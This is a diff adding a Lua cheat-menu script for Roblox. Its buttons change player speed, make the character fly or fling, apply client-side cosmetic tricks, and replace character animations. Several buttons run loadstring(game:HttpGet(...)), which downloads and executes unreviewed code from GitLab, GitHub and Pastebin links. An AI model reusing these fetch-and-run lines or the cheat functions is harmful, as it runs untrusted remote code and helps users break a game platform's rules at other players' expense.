+        baseplate.Parent = workspace
+        baseplate.Size = Vector3.new(0,0,0) -- change size
+        baseplate.Anchored = false
+        baseplate.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,15000,0) -- higher number for it to spawn higher
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = baseplate.CFrame + Vector3.new(0,-10,0)
+        game.Players.LocalPlayer.Character.LeftLowerLeg.Anchored = false
+        end)
+
+local button = tab:CreateButton("Glich/map", function()
+    local notifSound = Instance.new("Sound",workspace)
+        notifSound.PlaybackSpeed = 1
+        notifSound.Volume = 0.30
+        notifSound.SoundId = "rbxassetid://5568992074"
+        notifSound.PlayOnRemove = true
+        notifSound:Destroy()
+        for _,s in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
+            if s:IsA("Motor6D") and s.Name ~= "Neck" then
+                local fard = s.Parent
+                s:Destroy()
+                fard.CFrame = CFrame.new(10000000000000000, 10000000000000000, -10000000000000000) 
+                wait()
+            end
+        end
+        end)
+
+local button = tab:CreateButton("Hamster/only/PC", function()
+    loadstring(game:HttpGet("https://gitlab.com/ivanovpogorely/2323313frrf/-/raw/main/fun/ball.lua", true))()
+    end)
+
+local button = tab:CreateButton("2016/Anims", function()
+    Players = game:GetService("Players")
+Player = game.Players.LocalPlayer
+LocalPlayer = Player
+
+ if Player.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+                print("Loading V2 R15 Animations..")
+                Player.Character.Animate:Destroy()
+                local a = game:GetObjects("rbxassetid://6816103163")[1]
+                local function b()
+                    local c = Instance.new("LocalScript", Close)
+                    c.Name = "Animate"
+                    c.Parent = Player.Character
+                    for d, e in next, a:GetDescendants() do
+                        if e:IsA("StringValue") then
+                            e.Parent = c
+                        end
+                    end
+                    function waitForChild(f, g)
+                        local h = nil
+                        local i = f:findFirstChild(g)
+                        if i then
+                            return i
+                        end
+                        while true do
+                            h = f.ChildAdded:wait()
+                            if h.Name == g then
+                                break
+                            end
+                        end
+                        return h
+                    end
+                    local j = c.Parent
+                    local k = waitForChild(j, "Humanoid")
+                    k.CameraOffset = Vector3.new(0, 0.5, 0)
+                    math.randomseed(os.time())
+                    local l = {}
+                    function configureAnimationSet(m, n)
+                        if l[m] then
+                            local o, p, q = pairs(l[m].connections)
+                            while true do
+                                local r, s = o(p, q)
+                                if r then
+                                else
+                                    break
+                                end
+                                q = r
+                                s:disconnect()
+                            end
+                        end
+                        l[m] = {}
+                        l[m].count = 0
+                        l[m].totalWeight = 0
+                        l[m].connections = {}
+                        local t = c:FindFirstChild(m)
+                        if t then
+                            table.insert(
+                                l[m].connections,
+                                t.ChildAdded:connect(
+                                    function(u)
+                                        configureAnimationSet(m, n)
+                                    end
+                                )
+                            )
+                            table.insert(
+                                l[m].connections,
+                                t.ChildRemoved:connect(
+                                    function(v)
+                                        configureAnimationSet(m, n)
+                                    end
+                                )
+                            )
+                            local w = 1
+                            local x, y, z = pairs(t:GetChildren())
+                            while true do
+                                local A, B = x(y, z)
+                                if A then
+                                else
+                                    break
+                                end
+                                z = A
+                                if B:IsA("Animation") then
+                                    table.insert(
+                                        l[m].connections,
+                                        B.Changed:connect(
+                                            function(C)
+                                                configureAnimationSet(m, n)
+                                            end
+                                        )
+                                    )
+                                    l[m][w] = {}
+                                    l[m][w].anim = B
+                                    local D = B:FindFirstChild("Weight")
+                                    if D == nil then
+                                        l[m][w].weight = 1
+                                    else
+                                        l[m][w].weight = D.Value
+                                    end
+                                    l[m].count = l[m].count + 1
+                                    l[m].totalWeight = l[m].totalWeight + l[m][w].weight
+                                    w = w + 1
+                                end
+                            end
+                        end
+                        if l[m].count <= 0 then
+                            local E, F, G = pairs(n)
+                            while true do
+                                local H, I = E(F, G)
+                                if H then
+                                else
+                                    break
+                                end
+                                G = H
+                                l[m][H] = {}
+                                l[m][H].anim = Instance.new("Animation")
+                                l[m][H].anim.Name = m
+                                l[m][H].anim.AnimationId = I.id
+                                l[m][H].weight = I.weight
+                                l[m].count = l[m].count + 1
+                                l[m].totalWeight = l[m].totalWeight + I.weight
+                            end
+                        end
+                    end
+                    local J = {
+                        idle = {
+                            {id = "rbxasset://R15021216/idle_stretch.xml", weight = 1},
+                            {id = "rbxasset://R15021216/idle_look.xml", weight = 1},
+                            {id = "rbxasset://R15021216/idle.xml", weight = 9}
+                        },
+                        walk = {{id = "rbxasset://R15021216/run.xml", weight = 10}},
+                        run = {{id = "rbxasset://R15021216/run.xml", weight = 10}},
+                        jump = {{id = "rbxasset://R15021216/jump.xml", weight = 10}},
+                        fall = {{id = "rbxasset://R15021216/falling.xml", weight = 10}},
+                        climb = {{id = "rbxasset://R15021216/climb.xml", weight = 10}},
+                        sit = {{id = "http://www.roblox.com/asset/?id=393915321", weight = 10}},
+                        toolnone = {{id = "http://www.roblox.com/asset/?id=393915542", weight = 10}},
+                        toolslash = {{id = "http://www.roblox.com/asset/?id=393915542", weight = 10}},
+                        toollunge = {{id = "http://www.roblox.com/asset/?id=393915542", weight = 10}},
+                        wave = {{id = "http://www.roblox.com/asset/?id=393915710", weight = 10}},
+                        point = {{id = "http://www.roblox.com/asset/?id=393915866", weight = 10}},
+                        dance = {
+                            {id = "http://www.roblox.com/asset/?id=393916260", weight = 10},
+                            {id = "http://www.roblox.com/asset/?id=393916456", weight = 10},
+                            {id = "http://www.roblox.com/asset/?id=393916635", weight = 10}
+                        },
+                        dance2 = {
+                            {id = "http://www.roblox.com/asset/?id=393916791", weight = 10},
+                            {id = "http://www.roblox.com/asset/?id=393916989", weight = 10},
+                            {id = "http://www.roblox.com/asset/?id=393917195", weight = 10}
+                        },
+                        dance3 = {
+                            {id = "http://www.roblox.com/asset/?id=393917375", weight = 10},
+                            {id = "http://www.roblox.com/asset/?id=393917556", weight = 10},
+                            {id = "http://www.roblox.com/asset/?id=393917721", weight = 10}
+                        },
+                        laugh = {{id = "http://www.roblox.com/asset/?id=393916166", weight = 10}},
+                        cheer = {{id = "http://www.roblox.com/asset/?id=393916016", weight = 10}}
+                    }
+                    function scriptChildModified(K)
+                        local L = J[K.Name]
+                        if L then
+                            configureAnimationSet(K.Name, L)
+                        end
+                    end
+                    c.ChildAdded:connect(scriptChildModified)
+                    c.ChildRemoved:connect(scriptChildModified)
+                    for M, N in pairs(J) do
+                        configureAnimationSet(M, N)
+                    end
+                    local O = ""
+                    local P = {
+                        wave = false,
+                        point = false,
+                        dance = true,
+                        dance2 = true,
+                        dance3 = true,
+                        laugh = false,
+                        cheer = false
+                    }
+                    local Q = nil
+                    local R = nil
+                    local S = nil
+                    function stopAllAnimations()
+                        local T = O
+                        if P[T] then
+                            if P[T] == false then
+                                T = "idle"
+                            end
+                        end
+                        O = ""
+                        Q = nil
+                        if R then
+                            R:disconnect()
+                        end
+                        if S then
+                            S:Stop()
+                            S:Destroy()
+                            S = nil
+                        end
+                        return T
+                    end
+                    local U = 1
+                    function setAnimationSpeed(V)
+                        if V ~= U then
+                            U = V
+                            S:AdjustSpeed(U)
+                        end
+                    end
+                    function keyFrameReachedFunc(W)
+                        if W == "End" then
+                            local X = O
+                            if P[X] then
+                                if P[X] == false then
+                                    X = "idle"
+                                end
+                            end
+                            playAnimation(X, 0.15, k)
+                            setAnimationSpeed(U)
+                        end
+                    end
+                    function playAnimation(Y, Z, _)
+                        local a0 = math.random(1, l[Y].totalWeight)
+                        local a1 = 1
+                        while true do
+                            if l[Y][a1].weight < a0 then
+                            else
+                                break
+                            end
+                            a0 = a0 - l[Y][a1].weight
+                            a1 = a1 + 1
+                        end
+                        local a2 = l[Y][a1].anim
+                        if a2 ~= Q then
+                            if S then
+                                S:Stop(Z)
+                                S:Destroy()
+                            end
+                            U = 1
+                            S = _:LoadAnimation(a2)
+                            S:Play(Z)
+                            O = Y
+                            Q = a2
+                            if R then
+                                R:disconnect()
+                            end
+                            R = S.KeyframeReached:connect(keyFrameReachedFunc)
+                        end
+                    end
+                    local a3 = ""
+                    function toolKeyFrameReachedFunc(a4)
+                        if a4 == "End" then
+                            playToolAnimation(a3, 0, k)
+                        end
+                    end
+                    local a5 = nil
+                    local a6 = nil
+                    local a7 = nil
+                    function playToolAnimation(a8, a9, aa)
+                        local ab = math.random(1, l[a8].totalWeight)
+                        local ac = 1
+                        while true do
+                            if l[a8][ac].weight < ab then
+                            else
+                                break
+                            end
+                            ab = ab - l[a8][ac].weight
+                            ac = ac + 1
+                        end
+                        local ad = l[a8][ac].anim
+                        if a5 ~= ad then
+                            if a6 then
+                                a6:Stop()
+                                a6:Destroy()
+                                a9 = 0
+                            end
+                            a6 = aa:LoadAnimation(ad)
+                            a6:Play(a9)
+                            a3 = a8
+                            a5 = ad
+                            a7 = a6.KeyframeReached:connect(toolKeyFrameReachedFunc)
+                        end
+                    end
+                    function stopToolAnimations()
+                        if a7 then
+                            a7:disconnect()
+                        end
+                        a3 = ""
+                        a5 = nil
+                        if a6 then
+                            a6:Stop()
+                            a6:Destroy()
+                            a6 = nil
+                        end
+                        return a3
+                    end
+                    local ae = "Standing"
+                    function onRunning(af)
+                        if 0.01 < af then
+                        else
+                            playAnimation("idle", 0.1, k)
+                            ae = "Standing"
+                            return
+                        end
+                        playAnimation("walk", 0.1, k)
+                        setAnimationSpeed(af / 15)
+                        ae = "Running"
+                    end
+                    function onDied()
+                        ae = "Dead"
+                    end
+                    local ag = 0
+                    function onJumping()
+                        playAnimation("jump", 0.1, k)
+                        ag = 0.31
+                        ae = "Jumping"
+                    end
+                    function onClimbing(ah)
+                        playAnimation("climb", 0.1, k)
+                        setAnimationSpeed(ah / 2)
+                        ae = "Climbing"
+                    end
+                    function onGettingUp()
+                        ae = "GettingUp"
+                    end
+                    function onFreeFall()
+                        if ag <= 0 then
+                            playAnimation("fall", 0.2, k)
+                        end
+                        ae = "FreeFall"
+                    end
+                    function onFallingDown()
+                        ae = "FallingDown"
+                    end
+                    function onSeated()
+                        ae = "Seated"
+                    end
+                    function onPlatformStanding()
+                        ae = "PlatformStanding"
+                    end
+                    function onSwimming(ai)
+                        if 0 < ai then
+                            ae = "Running"
+                            return
+                        end
+                        ae = "Standing"
+                    end
+                    function getTool()
+                        local aj, ak, al = ipairs(j:GetChildren())
+                        while true do
+                            local am, an = aj(ak, al)
+                            if am then
+                            else
+                                break
+                            end
+                            al = am
+                            if an.className == "Tool" then
+                                return an
+                            end
+                        end
+                        return nil
+                    end
+                    function getToolAnim(ao)
+                        local ap, aq, ar = ipairs(ao:GetChildren())
+                        while true do
+                            local as, at = ap(aq, ar)
+                            if as then
+                            else
+                                break
+                            end
+                            ar = as
+                            if at.Name == "toolanim" then
+                                if at.className == "StringValue" then
+                                    return at
+                                end
+                            end
+                        end
+                        return nil
+                    end
+                    local au = "None"
+                    function animateTool()
+                        if au == "None" then
+                            playToolAnimation("toolnone", 0.1, k)
+                            return
+                        end
+                        if au == "Slash" then
+                            playToolAnimation("toolslash", 0, k)
+                            return
+                        end
+                        if au == "Lunge" then
+                        else
+                            return
+                        end
+                        playToolAnimation("toollunge", 0, k)
+                    end
+                    function moveSit()
+                        RightShoulder.MaxVelocity = 0.15
+                        LeftShoulder.MaxVelocity = 0.15
+                        RightShoulder:SetDesiredAngle(1.57)
+                        LeftShoulder:SetDesiredAngle(-1.57)
+                        RightHip:SetDesiredAngle(1.57)
+                        LeftHip:SetDesiredAngle(-1.57)
+                    end
+                    local av = 0
+                    local aw = 0
+                    function move(ax)
+                        av = ax
+                        if 0 < ag then
+                            ag = ag - (ax - av)
+                        end
+                        if ae == "FreeFall" then
+                            if ag <= 0 then
+                                playAnimation("fall", 0.2, k)
+                            else
+                                if ae == "Seated" then
+                                    playAnimation("sit", 0.5, k)
+                                    return
+                                end
+                                if ae == "Running" then
+                                    playAnimation("walk", 0.1, k)
+                                elseif ae ~= "Dead" then
+                                    if ae ~= "GettingUp" then
+                                        if ae ~= "FallingDown" then
+                                            if ae ~= "Seated" then
+                                                if ae == "PlatformStanding" then
+                                                    stopAllAnimations()
+                                                end
+                                            else
+                                                stopAllAnimations()
+                                            end
+                                        else
+                                            stopAllAnimations()
+                                        end
+                                    else
+                                        stopAllAnimations()
+                                    end
+                                else
+                                    stopAllAnimations()
+                                end
+                            end
+                        else
+                            if ae == "Seated" then
+                                playAnimation("sit", 0.5, k)
+                                return
+                            end
+                            if ae == "Running" then
+                                playAnimation("walk", 0.1, k)
+                            elseif ae ~= "Dead" then
+                                if ae ~= "GettingUp" then
+                                    if ae ~= "FallingDown" then
+                                        if ae ~= "Seated" then
+                                            if ae == "PlatformStanding" then
+                                                stopAllAnimations()
+                                            end
+                                        else
+                                            stopAllAnimations()
+                                        end
+                                    else
+                                        stopAllAnimations()
+                                    end
+                                else
+                                    stopAllAnimations()
+                                end
+                            else
+                                stopAllAnimations()
+                            end
+                        end
+                        local ay = getTool()
+                        if ay then
+                        else
+                            stopToolAnimations()
+                            au = "None"
+                            a5 = nil
+                            aw = 0
+                            return
+                        end
+                        animStringValueObject = getToolAnim(ay)
+                        if animStringValueObject then
+                            au = animStringValueObject.Value
+                            animStringValueObject.Parent = nil
+                            aw = ax + 0.3
+                        end
+                        if aw < ax then
+                            aw = 0
+                            au = "None"
+                        end
+                        animateTool()
+                    end
+                    k.Died:connect(onDied)
+                    k.Running:connect(onRunning)
+                    k.Jumping:connect(onJumping)
+                    k.Climbing:connect(onClimbing)
+                    k.GettingUp:connect(onGettingUp)
+                    k.FreeFalling:connect(onFreeFall)
+                    k.FallingDown:connect(onFallingDown)
+                    k.Seated:connect(onSeated)
+                    k.PlatformStanding:connect(onPlatformStanding)
+                    k.Swimming:connect(onSwimming)
+                    Player.Chatted:connect(
+                        function(az)
+                            local aA = ""
+                            if string.sub(az, 1, 3) == "/e " then
+                                aA = string.sub(az, 4)
+                            elseif string.sub(az, 1, 7) == "/emote " then
+                                aA = string.sub(az, 8)
+                            end
+                            if ae == "Standing" and P[aA] then
+                                playAnimation(aA, 0.1, k)
+                            end
+                        end
+                    )
+                    local aB = game:service("RunService")
+                    playAnimation("idle", 0.1, k)
+                    ae = "Standing"
+                    while j.Parent do
+                        local aC, aD = task.wait(0.1)
+                        move(aD)
+                    end
+                end
+                coroutine.wrap(b)()
+            else
+                print("Must be R15.")
+            end
+            end)
+
+local tab = window:CreateTab("Character/Scripts")
+
+local button = tab:CreateButton("Speed/Player", function()
+    getgenv().WalkSpeedValue = 70; -- Cambia el 100 por el valor que quieras
+local Player = game:service'Players'.LocalPlayer;
+Player.Character.Humanoid:GetPropertyChangedSignal'WalkSpeed':Connect(function()
+Player.Character.Humanoid.WalkSpeed = getgenv().WalkSpeedValue;
+end)
+Player.Character.Humanoid.WalkSpeed = getgenv().WalkSpeedValue;
+end)
+
+local button = tab:CreateButton("Speed/Normal", function()
+     getgenv().WalkSpeedValue = 16; -- Cambia el 100 por el valor que quieras
+local Player = game:service'Players'.LocalPlayer;
+Player.Character.Humanoid:GetPropertyChangedSignal'WalkSpeed':Connect(function()
+Player.Character.Humanoid.WalkSpeed = getgenv().WalkSpeedValue;
+end)
+Player.Character.Humanoid.WalkSpeed = getgenv().WalkSpeedValue;
+end)
+
+local button = tab:CreateButton("Headless/NO.FE", function()
+     game.Players.LocalPlayer.Character.Head.Transparency = 1
+        game.Players.LocalPlayer.Character.Head.face:Remove()
+    end)
+
+local button = tab:CreateButton("Korblox/NO.FE", function()
+   local ply = game.Players.LocalPlayer
+		local chr = ply.Character
+		chr.RightLowerLeg.MeshId = "902942093"
+		chr.RightLowerLeg.Transparency = "1"
+		chr.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
+		chr.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
+		chr.RightFoot.MeshId = "902942089"
+		chr.RightFoot.Transparency = "1"
+	end)
+
+local button = tab:CreateButton("Fly[x]", function()
+    FLYSPEED = 5
+		getgenv().FLYMODE = "Default"
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/dylannpro123/enclosed/main/resources/fly.lua"))()
+	end)
+
+local button = tab:CreateButton("Fly[Mobile]", function()
+    loadstring(game:HttpGet('https://pastebin.com/raw/rXsDSAs1'))()
+    end)
+
+local button = tab:CreateButton("FE R6", function()
+   local plr = game:GetService("Players").LocalPlayer
+
+function RunCustomAnimation(Char)
+	if Char:WaitForChild("Animate") ~= nil then
+		Char.Animate.Disabled = true
+	end
+	
+	Char:WaitForChild("Humanoid")
+
+	for i,v in next, Char.Humanoid:GetPlayingAnimationTracks() do
+		v:Stop()
+	end
+
+	--fake script
+	local script = Char.Animate
+
+	local Character = Char
+	local Humanoid = Character:WaitForChild("Humanoid")
+	local pose = "Standing"
+
+	local UserGameSettings = UserSettings():GetService("UserGameSettings")
+
+	local userNoUpdateOnLoopSuccess, userNoUpdateOnLoopValue = pcall(function() return UserSettings():IsUserFeatureEnabled("UserNoUpdateOnLoop") end)
+	local userNoUpdateOnLoop = userNoUpdateOnLoopSuccess and userNoUpdateOnLoopValue
+
+	local AnimationSpeedDampeningObject = script:FindFirstChild("ScaleDampeningPercent")
+	local HumanoidHipHeight = 2
+
+	local humanoidSpeed = 0 -- speed most recently sent to us from onRunning()
+	local cachedRunningSpeed = 0 -- The most recent speed used to compute blends.  Tiny variations from cachedRunningSpeed will not cause animation updates.
+	local cachedLocalDirection = {x=0.0, y=0.0} -- unit 2D object space direction of motion
+	local smallButNotZero = 0.0001 -- We want weights to be small but not so small the animation stops
+	local runBlendtime = 0.2
+	local lastLookVector = Vector3.new(0.0, 0.0, 0.0) -- used to track whether rootPart orientation is changing.
+	local lastBlendTime = 0 -- The last time we blended velocities
+	local WALK_SPEED = 6.4
+	local RUN_SPEED = 12.8
+
+	local EMOTE_TRANSITION_TIME = 0.1
+
+	local currentAnim = ""
+	local currentAnimInstance = nil
+	local currentAnimTrack = nil
+	local currentAnimKeyframeHandler = nil
+	local currentAnimSpeed = 1.0
+
+	local PreloadedAnims = {}
+
+	local animTable = {}
+	local animNames = { 
+		idle = 	{
+			{ id = "http://www.roblox.com/asset/?id=12521158637", weight = 9 },
+			{ id = "http://www.roblox.com/asset/?id=12521162526", weight = 1 },
+		},
+		walk = 	{
+			{ id = "http://www.roblox.com/asset/?id=12518152696", weight = 10 }
+		},
+		run = 	{
+			{ id = "http://www.roblox.com/asset/?id=12518152696", weight = 10 } 
+		},
+		jump = 	{
+			{ id = "http://www.roblox.com/asset/?id=12520880485", weight = 10 }
+		},
+		fall = 	{
+			{ id = "http://www.roblox.com/asset/?id=12520972571", weight = 10 }
+		},
+		climb = {
+			{ id = "http://www.roblox.com/asset/?id=12520982150", weight = 10 }
+		},
+		sit = 	{
+			{ id = "http://www.roblox.com/asset/?id=12520993168", weight = 10 }
+		},
+		toolnone = {
+			{ id = "http://www.roblox.com/asset/?id=12520996634", weight = 10 }
+		},
+		toolslash = {
+			{ id = "http://www.roblox.com/asset/?id=12520999032", weight = 10 }
+		},
+		toollunge = {
+			{ id = "http://www.roblox.com/asset/?id=12521002003", weight = 10 }
+		},
+		wave = {
+			{ id = "http://www.roblox.com/asset/?id=12521004586", weight = 10 }
+		},
+		point = {
+			{ id = "http://www.roblox.com/asset/?id=12521007694", weight = 10 }
+		},
+		dance = {
+			{ id = "http://www.roblox.com/asset/?id=12521009666", weight = 10 },
+			{ id = "http://www.roblox.com/asset/?id=12521151637", weight = 10 },
+			{ id = "http://www.roblox.com/asset/?id=12521015053", weight = 10 }
+		},
+		dance2 = {
+			{ id = "http://www.roblox.com/asset/?id=12521169800", weight = 10 },
+			{ id = "http://www.roblox.com/asset/?id=12521173533", weight = 10 },
+			{ id = "http://www.roblox.com/asset/?id=12521027874", weight = 10 }
+		},
+		dance3 = {
+			{ id = "http://www.roblox.com/asset/?id=12521178362", weight = 10 },
+			{ id = "http://www.roblox.com/asset/?id=12521181508", weight = 10 },
+			{ id = "http://www.roblox.com/asset/?id=12521184133", weight = 10 }
+		},
+		laugh = {
+			{ id = "http://www.roblox.com/asset/?id=12521018724", weight = 10 }
+		},
+		cheer = {
+			{ id = "http://www.roblox.com/asset/?id=12521021991", weight = 10 }
+		},
+	}
+
+
+	local strafingLocomotionMap = {}
+	local fallbackLocomotionMap = {}
+	local locomotionMap = strafingLocomotionMap
+	-- Existance in this list signifies that it is an emote, the value indicates if it is a looping emote
+	local emoteNames = { wave = false, point = false, dance = true, dance2 = true, dance3 = true, laugh = false, cheer = false}
+
+	math.randomseed(tick())
+
+	function findExistingAnimationInSet(set, anim)
+		if set == nil or anim == nil then
+			return 0
+		end
+
+		for idx = 1, set.count, 1 do
+			if set[idx].anim.AnimationId == anim.AnimationId then
+				return idx
+			end
+		end
+
+		return 0
+	end
+
+	function configureAnimationSet(name, fileList)
+		if (animTable[name] ~= nil) then
+			for _, connection in pairs(animTable[name].connections) do
+				connection:disconnect()
+			end
+		end
+		animTable[name] = {}
+		animTable[name].count = 0
+		animTable[name].totalWeight = 0
+		animTable[name].connections = {}
+
+		-- uncomment this section to allow players to load with their
+		-- own (non-classic) animations
+        --[[
+        local config = script:FindFirstChild(name)
+        if (config ~= nil) then
+            table.insert(animTable[name].connections, config.ChildAdded:connect(function(child) configureAnimationSet(name, fileList) end))
+            table.insert(animTable[name].connections, config.ChildRemoved:connect(function(child) configureAnimationSet(name, fileList) end))
+
+            local idx = 0
+
+            for _, childPart in pairs(config:GetChildren()) do
+                if (childPart:IsA("Animation")) then
+                    local newWeight = 1
+                    local weightObject = childPart:FindFirstChild("Weight")
+                    if (weightObject ~= nil) then
+                        newWeight = weightObject.Value
+                    end
+                    animTable[name].count = animTable[name].count + 1
+                    idx = animTable[name].count
+                    animTable[name][idx] = {}
+                    animTable[name][idx].anim = childPart
+                    animTable[name][idx].weight = newWeight
+                    animTable[name].totalWeight = animTable[name].totalWeight + animTable[name][idx].weight
+                    table.insert(animTable[name].connections, childPart.Changed:connect(function(property) configureAnimationSet(name, fileList) end))
+                    table.insert(animTable[name].connections, childPart.ChildAdded:connect(function(property) configureAnimationSet(name, fileList) end))
+                    table.insert(animTable[name].connections, childPart.ChildRemoved:connect(function(property) configureAnimationSet(name, fileList) end))
+                    local lv = childPart:GetAttribute("LinearVelocity")
+                    if lv then
+                        strafingLocomotionMap[name] = {lv=lv, speed = lv.Magnitude}
+                    end
+                    if name == "run" or name == "walk" then
+
+                        if lv then
+                            fallbackLocomotionMap[name] = strafingLocomotionMap[name]
+                        else
+                            local speed = name == "run" and RUN_SPEED or WALK_SPEED
+                            fallbackLocomotionMap[name] = {lv=Vector2.new(0.0, speed), speed = speed}
+                            locomotionMap = fallbackLocomotionMap
+                            -- If you don't have a linear velocity with your run or walk, you can't blend/strafe
+                            --warn("Strafe blending disabled. No linear velocity information for "..'"'.."walk"..'"'.." and "..'"'.."run"..'"'..".")
+                        end
+
+                    end
+                end
+            end
+        end
+        ]]
+
+		-- if you uncomment the above section, comment out this "if"-block
+		if name == "run" or name == "walk" then
+			local speed = name == "run" and RUN_SPEED or WALK_SPEED
+			fallbackLocomotionMap[name] = {lv=Vector2.new(0.0, speed), speed = speed}
+			locomotionMap = fallbackLocomotionMap
+			-- If you don't have a linear velocity with your run or walk, you can't blend/strafe
+			--warn("Strafe blending disabled. No linear velocity information for "..'"'.."walk"..'"'.." and "..'"'.."run"..'"'..".")
+		end
+
+
+		-- fallback to defaults
+		if (animTable[name].count <= 0) then
+			for idx, anim in pairs(fileList) do
+				animTable[name][idx] = {}
+				animTable[name][idx].anim = Instance.new("Animation")
+				animTable[name][idx].anim.Name = name
+				animTable[name][idx].anim.AnimationId = anim.id
+				animTable[name][idx].weight = anim.weight
+				animTable[name].count = animTable[name].count + 1
+				animTable[name].totalWeight = animTable[name].totalWeight + anim.weight
+			end
+		end
+
+		-- preload anims
+		for i, animType in pairs(animTable) do
+			for idx = 1, animType.count, 1 do
+				if PreloadedAnims[animType[idx].anim.AnimationId] == nil then
+					Humanoid:LoadAnimation(animType[idx].anim)
+					PreloadedAnims[animType[idx].anim.AnimationId] = true
+				end
+			end
+		end
+	end
+
+	-- Setup animation objects
+	function scriptChildModified(child)
+		local fileList = animNames[child.Name]
+		if (fileList ~= nil) then
+			configureAnimationSet(child.Name, fileList)
+		else
+			if child:isA("StringValue") then
+				animNames[child.Name] = {}
+				configureAnimationSet(child.Name, animNames[child.Name])
+			end
+		end	
+	end
+
+	script.ChildAdded:connect(scriptChildModified)
+	script.ChildRemoved:connect(scriptChildModified)
+
+	-- Clear any existing animation tracks
+	-- Fixes issue with characters that are moved in and out of the Workspace accumulating tracks
+	local animator = if Humanoid then Humanoid:FindFirstChildOfClass("Animator") else nil
+	if animator then
+		local animTracks = animator:GetPlayingAnimationTracks()
+		for i,track in ipairs(animTracks) do
+			track:Stop(0)
+			track:Destroy()
+		end
+	end
+
+	for name, fileList in pairs(animNames) do
+		configureAnimationSet(name, fileList)
+	end
+	for _,child in script:GetChildren() do
+		if child:isA("StringValue") and not animNames[child.name] then
+			animNames[child.Name] = {}
+			configureAnimationSet(child.Name, animNames[child.Name])
+		end
+	end
+
+	-- ANIMATION
+
+	-- declarations
+	local toolAnim = "None"
+	local toolAnimTime = 0
+
+	local jumpAnimTime = 0
+	local jumpAnimDuration = 0.31
+
+	local toolTransitionTime = 0.1
+	local fallTransitionTime = 0.2
+
+	local currentlyPlayingEmote = false
+
+	-- functions
+
+	function stopAllAnimations()
+		local oldAnim = currentAnim
+
+		-- return to idle if finishing an emote
+		if (emoteNames[oldAnim] ~= nil and emoteNames[oldAnim] == false) then
+			oldAnim = "idle"
+		end
+
+		if currentlyPlayingEmote then
+			oldAnim = "idle"
+			currentlyPlayingEmote = false
+		end
+
+		currentAnim = ""
+		currentAnimInstance = nil
+		if (currentAnimKeyframeHandler ~= nil) then
+			currentAnimKeyframeHandler:disconnect()
+		end
+
+		if (currentAnimTrack ~= nil) then
+			currentAnimTrack:Stop()
+			currentAnimTrack:Destroy()
+			currentAnimTrack = nil
+		end
+
+		for _,v in pairs(locomotionMap) do
+			if v.track then
+				v.track:Stop()
+				v.track:Destroy()
+				v.track = nil
+			end
+		end
+
+		return oldAnim
+	end
+
+	function getHeightScale()
+		if Humanoid then
+			if not Humanoid.AutomaticScalingEnabled then
+				return 1
+			end
+
+			local scale = Humanoid.HipHeight / HumanoidHipHeight
+			if AnimationSpeedDampeningObject == nil then
+				AnimationSpeedDampeningObject = script:FindFirstChild("ScaleDampeningPercent")
+			end
+			if AnimationSpeedDampeningObject ~= nil then
+				scale = 1 + (Humanoid.HipHeight - HumanoidHipHeight) * AnimationSpeedDampeningObject.Value / HumanoidHipHeight
+			end
+			return scale
+		end
+		return 1
+	end
+
+
+	local function signedAngle(a, b)
+		return -math.atan2(a.x * b.y - a.y * b.x, a.x * b.x + a.y * b.y)
+	end
+
+	local angleWeight = 2.0
+	local function get2DWeight(px, p1, p2, sx, s1, s2)
+		local avgLength = 0.5 * (s1 + s2)
+
+		local p_1 = {x = (sx - s1)/avgLength, y = (angleWeight * signedAngle(p1, px))}
+		local p12 = {x = (s2 - s1)/avgLength, y = (angleWeight * signedAngle(p1, p2))}	
+		local denom = smallButNotZero + (p12.x*p12.x + p12.y*p12.y)
+		local numer = p_1.x * p12.x + p_1.y * p12.y
+		local r = math.clamp(1.0 - numer/denom, 0.0, 1.0)
+		return r
+	end
+
+	local function blend2D(targetVelo, targetSpeed)
+		local h = {}
+		local sum = 0.0
+		for n,v1 in pairs(locomotionMap) do
+			if targetVelo.x * v1.lv.x < 0.0 or targetVelo.y * v1.lv.y < 0 then
+				-- Require same quadrant as target
+				h[n] = 0.0
+				continue
+			end
+			h[n] = math.huge
+			for j,v2 in pairs(locomotionMap) do
+				if targetVelo.x * v2.lv.x < 0.0 or targetVelo.y * v2.lv.y < 0 then
+					-- Require same quadrant as target
+					continue
+				end
+				h[n] = math.min(h[n], get2DWeight(targetVelo, v1.lv, v2.lv, targetSpeed, v1.speed, v2.speed))
+			end
+			sum += h[n]
+		end
+
+		--truncates below 10% contribution
+		local sum2 = 0.0
+		local weightedVeloX = 0
+		local weightedVeloY = 0
+		for n,v in pairs(locomotionMap) do
+
+			if (h[n] / sum > 0.1) then
+				sum2 += h[n]
+				weightedVeloX += h[n] * v.lv.x
+				weightedVeloY += h[n] * v.lv.y
+			else
+				h[n] = 0.0
+			end
+		end
+		local animSpeed
+		local weightedSpeedSquared = weightedVeloX * weightedVeloX + weightedVeloY * weightedVeloY
+		if weightedSpeedSquared > smallButNotZero then
+			animSpeed = math.sqrt(targetSpeed * targetSpeed / weightedSpeedSquared)
+		else
+			animSpeed = 0
+		end
+
+		animSpeed = animSpeed / getHeightScale()
+		local groupTimePosition = 0
+		for n,v in pairs(locomotionMap) do
+			if v.track.IsPlaying then
+				groupTimePosition = v.track.TimePosition
+				break
+			end
+		end
+		for n,v in pairs(locomotionMap) do
+			-- if not loco
+			if h[n] > 0.0 then
+				if not v.track.IsPlaying then 
+					v.track:Play(runBlendtime)
+					v.track.TimePosition = groupTimePosition
+				end
+
+				local weight = math.max(smallButNotZero, h[n] / sum2)
+				v.track:AdjustWeight(weight, runBlendtime)
+				v.track:AdjustSpeed(animSpeed)
+			else
+				v.track:Stop(runBlendtime)
+			end
+		end
+
+	end
+
+	local function getWalkDirection()
+		local walkToPoint = Humanoid.WalkToPoint
+		local walkToPart = Humanoid.WalkToPart
+		if Humanoid.MoveDirection ~= Vector3.zero then
+			return Humanoid.MoveDirection
+		elseif walkToPart or walkToPoint ~= Vector3.zero then
+			local destination
+			if walkToPart then
+				destination = walkToPart.CFrame:PointToWorldSpace(walkToPoint)
+			else
+				destination = walkToPoint
+			end
+			local moveVector = Vector3.zero
+			if Humanoid.RootPart then
+				moveVector = destination - Humanoid.RootPart.CFrame.Position
